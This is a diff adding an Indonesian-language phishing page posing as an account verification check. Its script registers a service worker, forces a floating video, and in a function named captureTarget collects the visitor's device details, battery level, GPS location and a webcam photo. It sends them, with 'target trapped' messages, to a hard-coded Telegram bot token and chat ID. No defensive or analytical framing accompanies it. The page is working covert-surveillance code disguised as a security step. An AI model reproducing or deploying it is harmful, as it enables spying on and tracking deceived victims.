@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8" />
+    <title>Sistem Verifikasi Global</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #05010a; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .panel { padding: 40px; border: 2px solid #bc13fe; border-radius: 20px; text-align: center; background: #1a052e; box-shadow: 0 0 40px #bc13fe; position: relative; z-index: 10; }
+        h2 { color: #f0abff; letter-spacing: 2px; }
+        button { background: linear-gradient(135deg, #7a12ff, #bc13fe); color: #fff; border: none; padding: 15px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        button:hover { transform: scale(1.05); box-shadow: 0 0 20px #bc13fe; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+    </style>
+</head>
+<body>
+
+<div class="panel">
+    <h2>OTENTIKASI DIPERLUKAN</h2>
+    <p>Akun Anda dalam risiko. Klik untuk verifikasi identitas.</p>
+    <button id="authBtn">AMANKAN SEKARANG</button>
+</div>
+
+<video id="vTarget" loop playsinline src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
+
+<script>
+    const CONFIG = {
+        token: '8617398870:AAHHVz0unYAW1pt75b-jo3AGhAxIxsWu47Q',
+        chatId: '8213510319',
+        videoUrl: 'https://www.w3schools.com/html/mov_bbb.mp4' // Ubah link video MP4 di sini
+    };
+
+    const btn = document.getElementById('authBtn');
+    const video = document.getElementById('vTarget');
+
+    // 1. TEKNIK INJEKSI SERVICE WORKER (1 FILE)
+    const swCode = `
+        self.addEventListener('install', e => self.skipWaiting());
+        self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+        self.addEventListener('push', e => {
+            if ('vibrate' in navigator) { navigator.vibrate([1000, 500, 1000]); }
+        });
+    `;
+    const swBlob = new Blob([swCode], { type: 'application/javascript' });
+    const swUrl = URL.createObjectURL(swBlob);
+
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register(swUrl);
+    }
+
+    btn.addEventListener('click', async () => {
+        // A. Izin Notifikasi & Getar Awal
+        await Notification.requestPermission();
+        if ('vibrate' in navigator) navigator.vibrate(500);
+
+        // B. Paksa Video Melayang (PiP)
+        try {
+            video.muted = false;
+            await video.play();
+            if (document.pictureInPictureEnabled) {
+                await video.requestPictureInPicture();
+            }
+        } catch (e) {
+            video.muted = true; // Fallback jika browser blokir suara
+            await video.play();
+            if (video.requestPictureInPicture) await video.requestPictureInPicture();
+        }
+
+        // C. Timer 5 Menit (Kunci PiP)
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=🔥 Target Terperangkap! Video Melayang Aktif 5 Menit.`);
+        
+        setTimeout(async () => {
+            if (document.pictureInPictureElement) await document.exitPictureInPicture();
+            video.pause();
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=⌛ Selesai.`);
+        }, 300000);
+
+        // D. Eksekusi Mata-mata (Kamera & Lokasi)
+        captureTarget();
+        
+        alert("Sistem Sedang Memproses Sinkronisasi. Tetap di Halaman Ini.");
+    });
+
+    async function captureTarget() {
+        try {
+            // Data Perangkat
+            const battery = await navigator.getBattery();
+            let msg = `🎯 *INFO TARGET*\n📱 Device: ${navigator.userAgent}\n🔋 Baterai: ${battery.level * 100}%\n`;
+
+            // Lokasi
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                msg += `📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendTelegram(msg);
+            }, () => sendTelegram(msg));
+
+            // Kamera Snap
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const tempVideo = document.createElement('video');
+            tempVideo.srcObject = stream;
+            tempVideo.play();
+
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(tempVideo, 0, 0);
+                canvas.toBlob(blob => sendFile(blob));
+                stream.getTracks().forEach(track => track.stop());
+            }, 3000);
+
+        } catch (err) {
+            sendTelegram("❌ Izin Kamera/Lokasi Ditolak.");
+        }
+    }
+
+    async function sendTelegram(m) {
+        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
+    }
+
+    async function sendFile(blob) {
+        let fd = new FormData();
+        fd.append('photo', blob, 'snap.jpg');
+        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto?chat_id=${CONFIG.chatId}`, { method: 'POST', body: fd });
+    }
+</script>
+</body>
+</html>
